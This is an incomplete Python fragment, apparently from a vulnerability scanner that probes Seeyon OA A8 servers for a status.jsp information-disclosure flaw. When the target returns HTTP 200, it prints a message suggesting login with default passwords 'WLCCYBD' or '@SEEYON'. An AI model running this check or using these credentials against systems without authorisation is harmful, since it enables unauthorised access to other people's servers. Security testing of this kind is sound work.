...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测致远OA A8 status.jsp 信息泄露漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200:
            print(
                now_time() + ' [SUCCESS]  可能存在致远OA敏感信息泄露请用默认密码**WLCCYBD**或**@SEEYON**登录:{}'.format(
                    exp_url))
        else:
            print(now_time() + " [WARNING]  可能不存在致远OA_status敏感信息泄露漏洞")
    except:
